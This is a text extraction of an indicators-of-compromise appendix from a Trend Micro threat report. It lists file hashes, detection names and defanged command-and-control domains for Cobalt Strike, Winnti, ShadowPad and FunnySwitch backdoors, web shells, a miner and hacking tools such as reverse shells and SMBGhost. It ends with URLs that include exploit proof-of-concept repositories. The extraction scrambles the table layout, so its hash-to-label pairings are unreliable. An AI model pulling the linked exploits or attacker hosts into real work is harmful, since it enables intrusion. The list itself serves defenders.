\n7a0b6ab149abd2c05\n3278acda610ed2a2a\n07a8e70d8897fe34ea\nebaa3fffcfb8 \nabf59d67fcafa42fb5d\n4f562870af2aa092c6\n78673b6c404b5afe2e\nadb18229d \n318dbf3cfca46574c16\nf5e20828b2a878665a\n8209120efd9e611d8c\nf98954afa \n161afaaa83bc5202af\n3e4f7a083fa3f888d59\nf381f7a3e06176dc8e\n048fe066f \nc7a9eb1c6d1bbea607\n59fa6e4396254d8979\n22bc86c6c1d1b520f0\na2357184d6 \nf819177fb5f6489f3cf0\nff402bbf5d4678c2b70\n3e09c1e26ac00fb083\n76edb13 \n98356e59608a77921\nd0f6f2ac95ab58302d\n69e9333447aab9151\n2e0976c8b368 \n4347bd2231fcda57da\n6201dde35818817fca\n\nCobalt Strike \n\nTrojan.Win64.COBAL\nTSTRIKE.H \n\nTroj.Win32.TRX.XXP\nE50FFF051 \n\nCobalt Strike \n\nTrojan.Win64.COBAL\nTSTRIKE.H \n\nTroj.Win32.TRX.XXP\nE50FFF051 \n\nCobalt Strike \n\nTrojan.Win64.COBAL\nTSTRIKE.H \n\nN/A \n\nCobalt Strike \n\nTrojan.Win64.COBAL\nTSTRIKE.H \n\nTroj.Win32.TRX.XXP\nE50FFF051 \n\nCobalt Strike \n\nTrojan.Win64.COBAL\nTSTRIKE.H \n\nTroj.Win32.TRX.XXP\nE50FFF051 \n\nCobalt Strike \nPowerShell loader \n\nTrojan.PS1.COBALT\nSTRIKE.C \n\n N/A \n\nCobalt Strike \nPowerShell loader \n\nTrojan.PS1.COBALT\nSTRIKE.C \n\n N/A \n\nCobalt Strike \nPowerShell loader \n\nTrojan.PS1.COBALT\nSTRIKE.C \n\n N/A \n\nCobalt Strike \nPowerShell loader \n\nTrojan.PS1.COBALT\nSTRIKE.C \n\n N/A \n\nCobalt Strike \nPowerShell loader \n\nTrojan.PS1.COBALTST\nRIKE.C \n\n N/A \n\nCobalt Strike \nPowerShell loader \n\nTrojan.PS1.COBALT\nSTRIKE.C \n\n N/A \n\nCobalt Strike \nPowerShell loader \n\nTrojan.PS1.COBALT\nSTRIKE.C \n\n N/A \n\nCobalt Strike \nPowerShell loader \n\nTrojan.PS1.COBALT\nSTRIKE.C \n\n N/A \n\n \n\f05c2222d3660b49eb\n98eb07e322c \ne1efba0b38226e882a\n3cf3ce3b6374d0c825\n170057ea7d07141ae\n95e054de4a3 \n\nCobalt Strike \nPowerShell loader \n\nTrojan.PS1.COBALT\nSTRIKE.C \n\n N/A \n\nC&C server \n\nDNS server \ncoivo2xo.livehost[.]live \nwww.getdns[.]gd \ncookiestest[.]ml \nqqfinance[.]ml \nlzfhome[.]xyz \nybk47i6z8q.wikimedia[.]vip \nw01grw7gs.ithome[.]house \n\nWinnti \n\nFiles \n\nSHA256 \n\nNote \n\nDetection \n\nTrendX \n\ne46fcaac5f65a41004\n0010c338f2fc02d9ac\n0327344acab8ce515\n2529312c4ae \n66923293d6cd7169d\n843e26aade13896ce\n77214fbe256bd925d\n7b96187b2aa48 \n11e02158d456bb43c\n7d8abfc34cf46ad0ec\ncf7c93959ac90df24f5\n2ce6d8962c \n88cc62d5eeb21590d\na9b67b25ba588c297\n5a45289a829ab27b8\n20eaa2ff88ea2 \n367021e9ec138b828\n3fa83d5258bb06022f\n08aa129a9c6537203\n238b1bce538a \n\nWinnti backdoor \n\nBackdoor.Linux.WIN\nNTI.D \n\nTroj.ELF.TRX.XXELF\nC1DFF012 \n\nWinnti backdoor \n\nBackdoor.Linux.WIN\nNTI.D \n\nTroj.ELF.TRX.XXELF\nC1DFF012 \n\nWinnti backdoor \n\nBackdoor.Linux.WIN\nNTI.E \n\n Troj.ELF.TRX.XXEL\nFC1DFF012 \n\nWinnti backdoor \n\nBackdoor.Linux.WIN\nNTI.E \n\n Troj.ELF.TRX.XXEL\nFC1DFF012 \n\nWinnti backdoor \n\nBackdoor.Linux.WIN\nNTI.E \n\n Troj.ELF.TRX.XXEL\nFC1DFF012 \n\n \n \n \n \n \n  \n \n\fWinnti backdoor \n\nBackdoor.Linux.WIN\nNTI.E \n\n Troj.ELF.TRX.XXEL\nFC1DFF012 \n\n96cb323da444f9c650\n43cc69c4d85f9c72d6\nc9d47c2cdcfa8caec4\n55a9b9357e \n\nC&C server \n\nDNS server \nlmogv.dnslookup[.]services \nsmtp.nslookup[.]club \n3VnwTuq9s.ithome[.]house \n\nShadowPad \n\nFiles \n\nSHA256 \n92d22456861779595\n9723e2cc22d6e244d\n225c2210758f08965\nd5844f24feed8 \n196507c6dc3541c13\n1085f034609ba533fb\nafc54bee0477dab9c7\nbc214900e30 \n6de4eb04725383af8\n28d319f6253f65b939\n727df26b35ca424b9\n2e11ebb7110d \n54538baa089bdd0ae\ncc54bd3e8c3bdbb5d\nbf2eae18ed3178c80\n15b0d150bcba0 \nedee57d418cbde1a7\nab44edfbc2c4f99dba\nc107a823b4f4a5ccac\ne25d0d2b108 \ndbb32cb933b6bb25e\n499185d6db71386a4\nb5709500d2da92d37\n7171b7ff43294 \n8065da4300e12e95b\n45e64ff8493d9401db\n\nNote \nShadowPad \nbackdoor \n\nDetection \nBackdoor.Win32.SH\nADOWPAD.CGX \n\nTrendX \nN/A \n\nShadowPad \nbackdoor \n\nBackdoor.Win32.SH\nADOWPAD.CGY \n\n TROJ.Win32.TRX.X\nXPE50FFF051 \n\nShadowPad \nbackdoor \n\nBackdoor.Win32.SH\nADOWPAD.CGY \n\n  TROJ.Win32.TRX.X\nXPE50FFF051 \n\nShadowPad \nbackdoor \n\nBackdoor.Win32.SH\nADOWPAD.CGZ \n\nShadowPad \nbackdoor \n\nBackdoor.Win32.SH\nADOWPAD.CGY \n\n  TROJ.Win32.TRX.X\nXPE50FFF051 \n\nShadowPad \nbackdoor \n\nTrojan.win32.SHADO\nWPAD.CGX \n\n TROJ.Win32.TRX.X\nXPE50FFF051 \n\nShadowPad \nbackdoor \n\nBackdoor.Win32.SH\nADOWPAD.CGX.enc \n\n N/A \n\n \n \n \n \n \n \n \n  \n\f1ea61be85e74f74a7\n3b366283f27e \nc602456fae02510ff1\n82b45d4ffb69ee6aae\n11667460001241685\n807db2e29c3 \n94295f90dc5fb03fc47\ne8e2144774f103b8a\n29d2ada101173f193\ncd0c8a38f3d \n\nC&C server \n\nShadowPad \nbackdoor \n\nBackdoor.Win32.SH\nADOWPAD.CGX.enc \n\nN/A  \n\nShadowPad \nbackdoor \n\nBackdoor.Win32.SH\nADOWPAD.CGY.enc \n\n N/A \n\nDNS server \n5s2zm07ao.wikimedia[.]vip \nr1d3wg7xofs.livehost[.]live \n6czumi0fbg.symantecupd[.]com \n1dfpi2d8kx.wikimedia[.]vip \n5NcNt6z1.wikimedia[.]vip \n\nFunnySwitch \n\nFiles \n\nSHA256 \n\nNote \n\nDetection \n\nTrendX \n\n3fe1b293d8a50db95\nd50e6eec9773e9c2e\n552a0122fe4428de8\nd31061092d330 \n06a5413e0ffadc4d4fc\naf4782ef81d3e1b7a8\n60c580bbe37e9c0e9\n940e68161e \nf37c19b86a5b8b6c71\nd7350894506c72788\n64f7f968d0593a5e47\n7c728b91372 \n23dfce597a6afef4a1f\nffd0e7cf89eba31f964\nf3eabcec1545317efe\nb25082ed \n6f258841a10be2543\n878dc8479098f8fe17\n\nFunnySwitch \nbackdoor \n\nBackdoor.Win32.FU\nNNYSWITCH.A \n\nTROJ.Win32.TRX.XX\nPE50FFF052 \n\nFunnySwitch \nbackdoor \n\n Backdoor.Win32.FU\nNNYSWITCH.A \n\n TROJ.Win32.TRX.X\nXPE50FFF052 \n\nFunnySwitch \nbackdoor \n\n Backdoor.Win32.FU\nNNYSWITCH.A \n\n  TROJ.Win32.TRX.X\nXPE50FFF052 \n\nFunnySwitch \nbackdoor \n\n Backdoor.Win64.FU\nNNYSWITCH.A \n\n TROJ.Win32.TRX.X\nXPE50FFF051 \n\nFunnySwitch \nbackdoor \n\n Backdoor.Win64.FU\nNNYSWITCH.B \n\n N/A \n\n \n \n \n \n \n \n  \n\f52f4cbd7c29d6854f5\n329d0960e87 \n\nC&C server \n\nDNS server \n7hln9yr3y6.symantecupd[.]com \nbm2l41risv.livehost[.]live \no56n1tosy.livehost[.]live \nmztfki9x.wikimedia[.]vip  \nok3x377v3f.symantecupd[.]com \n\nWeb Shell \n\nFiles \n\nSHA256 \n\nNote \n\nDetection \n\nTrendX \n\nd7ecfd61915972f1d7\n4f51039fc97a3b2d85\n5a13c70a052ebb1bc\n80e78dd338 \nd7078956cb7be6e7e\n6751ec66ff0e1c428a\n67d8ab6be03f9ed6fb\ncede866c39e \ncd335698d4c2422e9\n24fdc67dcceb2037c9\n54d875f03aa298d9fb\n5f0db851548 \n4d0c611bece3baa5d\n1502b50779be653e2\n5c0ac8679111628d3\n2686002743600 \n60b4d23d41707ef7fc\n09e01f1864cb0d8c8a\n4f5d180fc97e559356\n780efcd54b \n7aaf33bb297926259\n0932dcfd6902d09a3c\n0045d906570a15123\nfa12f8656171 \n\nC# Webshell \n\nBackdoor.ASP.WEB\nSHELL.QUWMLAR \n\nN/A \n\nJSP Webshell \n\nBackdoor.Java.WEB\nSHELL.SBJKUG \n\nN/A  \n\nJSP Behinder \nWebshell \n\nBackdoor.Java.WEB\nSHELL.SBJKUG \n\nN/A  \n\nGamma Webshell \n\nBackdoor.JS.WEBSH\nELL.KEQW \n\n N/A \n\nPHP Webshell \n\nBackdoor.PHP.WEB\nSHELL.SBJKRW \n\n N/A \n\nPHP Webshell \n\nBackdoor.PHP.WEB\nSHELL.SBJKXRW \n\n N/A \n\n \n \n \n \n \n \n  \n\fPHP Webshell \n\nBackdoor.PHP.WEB\nSHELL.SBJKXRW \n\n N/A \n\nPHP Database \nWebshell (legitimate \nabused tool) \n\nPHP Webshell \n\nPHP Web Database \nManage (legitimate \nabused tool) \n\nPHP Web Database \nManage (legitimate \nabused tool) \n\nHS_DBShell.A \n\n N/A \n\nBackdoor.PHP.WEB\nSHELL.SBJKXRW \n\n N/A \n\nHS_Adminer.A \n\n N/A \n\n HS_Adminer.B \n\n N/A \n\nPHP Web Database \nDump \n\nBackdoor.PHP.DBSH\nELL.A \n\n  N/A \n\nPHP Web Database \nDump \n\nBackdoor.PHP.DBSH\nELL.A \n\n  N/A \n\nececbed665469514e\nd8583a4928f9a524f0\n0a9b9c3c042015717\nea22614398e4 \nb081db87c75b6aea9\n05a62532cb40bc21b\nc7acebb7a0c6c601d\n993c76a8c6ce1 \nbb45df12b63e5b133\ne6cb622b174ad68bc\n95a5bce15f98eede5\n6597d38401b27 \n566152a2d86186dcf\nb28856b4ed0dfdb60\ne355d93ab693f7931\n201f75868fff0 \ne2e969efc2d688e01\na9aa32d50176374af\n811a3324651fb03b7\nb848e06e0b677 \nc0725296e8ab3d9d3\nc932ecf45588f39ef8f\na7a310d31bfd05a06\n1194f8eeb1e \nb151285b331ab2450\ne2f7387590b29348e\nbb6f34391d4b10958f\naea715027795 \n\nTools  \n\nFiles \n\nSHA256 \n\nNote \n\nDetection \n\nTrendX \n\nb5577248f532c2939\ndb023d279d625fa4c\n01e9ee68441fe9004\n6d2b6e79ac1d7 \n9ee8b7ab27830bf61\n5ce82f4b4930d10b7\n35837842dfdd1d7ed\n25a460f76b863 \n7d036e80f60771037\n6a881653d7c26b4df\n\nTool - DrityCow \n\nHackTool.Linux.Dirty\nCow.A \n\n N/A \n\nTool - List Login RDP \nUsers \n\nHackTool.PS1.ListR\nDP.A \n\n  N/A \n\nTool \u2013 Port Scan \n\nHackTool.Python.PS\ncan.A \n\n N/A \n\n \n \n \n \n\fba87e45dbfc69bcb91\n3dbc01d67ef2 \nde4d7ea590f1f27f6c\neae6de40802f632eff\n7028cdb51c03b5f799\nda08abf80d \n9d2d265c0761366f2\nd8063bf2aed877fe9a\nda98008cc777919f75\n866b57febb8 \nc47be279811d42132\n98dc925ece7d87e97\n68a90705d4f8a3413\nd6e962d9fe6bc \nb16ee7b7cc4fbb390c\n9ee7a0be1760743b5\n21514d1100dc20cd3\n972de7d5252d \n622c797683ef9f83cf1\nf33367e5dc9b61cfd5\n77f4edc674d1ea6d5\nb310558097 \n3ea02150e161a7c10\ne845e1ca7504fe399f\n8f482603490b38a41\ne748b6580d02 \na49923faa7d2a2a5e\n191a0aeca3ffd48465\n5be1fdaaef81b3a85f\n28ce65859ae \nc4071807b1d03b9db\n79f1281785d89700c\n88008ec544b17488e\n2132ed89a32ac \nd1871f94304fdd7fea\n81f9a6a06908eaf874\n4bc784e698eb36a35\n2f9e2b2049f \n8d841149791b51f22\n6249d0e5459f9b97f7\n96be5a4e10ddc38ea\nfc393288a7f4 \n2e9fbdcb3b13bd05cf\n9f35125efb1ca9e28d\n9afba8d9ae33e4710\n75b0cafb16f \n0025f9eaa43f5bb04b\n5c1f751334b8fec102\n4c2cf04f8124d6051a\nb1d1ebf448 \n\nTool \u2013 WMI Exec \n\nPUA.VBS.WmiExec.\nA \n\n N/A \n\nTool \u2013 Get Current IP  HackTool.BAT.IPRan\n\n N/A \n\nges.A \n\nTool - MiniPenguin \n\nHackTool.SH.MiniPe\nnguin.A \n\n N/A \n\nTool - libprocesshider  HackTool.Linux.Proc\n\n N/A \n\nHide.B \n\nTool - SMBGhost \n\nHackTool.Win64.SM\nBGhost.A \n\n N/A \n\nTool - SMBGhost \n\nHackTool.Win64.SM\nBGhost.A \n\nN/A  \n\nTool \u2013 Juicy-Potato \n\nHackTool.Win32.Juic\nyPotato.I \n\nRansom.Win32.TRX.\nXXPE50FFF051  \n\nTool \u2013 ShellCode \nLoader \n\nTrojan.Win32.COBAL\nTSTRIKE.F \n\n Troj.Win32.TRX.XX\nPE50FFF052 \n\nTool \u2013 Reversed \nShell \n\nHackTool.Python.Re\nvShell.A \n\n N/A \n\nTool \u2013 Bash \nReversed Shell \n\nHackTool.SH.RevSh\nell.A \n\n N/A \n\nTool \u2013 ShellCode \n/bin/sh \n\nHackTool.Linux.GetS\nhell.A \n\n Troj.ELF.TRX.XXEL\nFC1DFF012 \n\nTool \u2013 HUC Port \nBanner Scanner V1.2 \n\nPUA.Win32.PortBann\ner.A \n\n N/A \n\n \n\fTool \u2013 NetBIOS \nscanner \n\nHackkTool.Win32.Nb\ntScan.ZAIC \n\n N/A \n\nTool - Fastscan \n\nHackTool.Win32.Fast\nScan.A \n\n N/A \n\nTool - Fastscan \n\nHackTool.Win64.Fast\nScan.A \n\n N/A \n\nTool - EarthWorm \n\nHackTool.Win32.Eart\nhWorm.B \n\n N/A \n\nTool \u2013 FRP Client \n\nHackTool.Win64.FRP\nC.C \n\n N/A \n\nTool - wtmpclean \n\nHackTool.Linux.WTm\npClean.A \n\n N/A \n\nTool - Megacmd \n\nPUA.Win64.MegaCM\nD.A \n\n N/A \n\nTool - BrowserGhost  HackTool.MSIL.Brow\n\n N/A \n\nserGhost.A \n\nc9d5dc956841e000bf\nd8762e2f0b48b66c7\n9b79500e894b4efa7f\nb9ba17e4e9e \n2951af1fbf080341f97\n7c7f8fd9916a42ad1f\n3d25fe7175def59860\n0d946898e \nb77c08892dd3fe6a9\n38201b56236130f48\n7b6c0fcf132a73b9bfa\n2baf0b45c46 \na76eaabc4e8ba5d6b\n3747825a9fbc286d4\n4d3981ac521119902\nd64ae2fdcc4b7 \n28332bdbfaeb8333d\nad5ada3c10819a1a0\n15db9106d5e8a74be\naaf03797511aa \n9cbcc08529dad8f0aa\ne689dbacffa34b5c48\n95d49cf68a81c785f5\n78482598a7 \n9042e5a9ce45e4288\nf1396ff8e3ba27e16b\n500d431f8b2da1bab\na3c35b7782ba \nf1a3cff4428b86501a\nbff58d98a740ad6038\n8ea8588190ee169d9\n56544b4d4ad \n\nXMR Miner \n\nFiles \n\nSHA256 \n\nNote \n\nDetection \n\nTrendX \n\n625a6ba45d06b3387\nb50802d3eac280bb8\n54327348b3a3fe486\n3cd0bd8a69a55 \n21cf3727a9e58f346b\ncdf039ad23ca8838da\ne902d0596726332f5\n815672d22e7 \n\nXMR MIner \n\nPUA.Linux.CyrptoMin\ner.AD \n\nTroj.ELF.TRX.XXELF\nC1DFF012  \n\nXMR Miner \n\nPUA.Linux.CryptoMin\ner.AD \n\nTroj.ELF.TRX.XXELF\nC1DFF012 \n\n \n \n \n \n  \n\f949aa21dcf474003f0\n6735cacdc9938bed3\n66c64fde6ced58a333\n6b007c0bb7b \n\nXMR Miner \n\nPUA.Win64.CryptoMi\nner.CFI \n\nTroj.Win32.TRX.XXP\nE50FFF051 \n\nTREND MICROTM RESEARCH \n\nTrend Micro, a global leader in cybersecurity, helps to make the world safe for exchanging digital information.  \n\nTrend Micro Research is powered by experts who are passionate about discovering new threats, sharing key insights, and \nsupporting efforts to stop cybercriminals. Our global team helps identify millions of threats daily, leads the industry in \nvulnerability disclosures, and publishes innovative research on new threats techniques. We continually work to anticipate new \nthreats and deliver thought-provoking research.   \n\nwww.trendmicro.com \n\n \n \n \n \n \n \n\f"], "URLs": ["https://raw.githubusercontent.com/yuilbrun/hmm/master/tas389", "http://www.akiyaku[.]jp/images/images/mm.html", "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/mast", "http://www.n[.]co/1/1/1/1", "https://github.com/RickGeex/ProxyLogon", "https://github.com/yuilbrun/hmm/", "https://github.com/dmaasland/proxyshell-poc"], "weight": 0.0}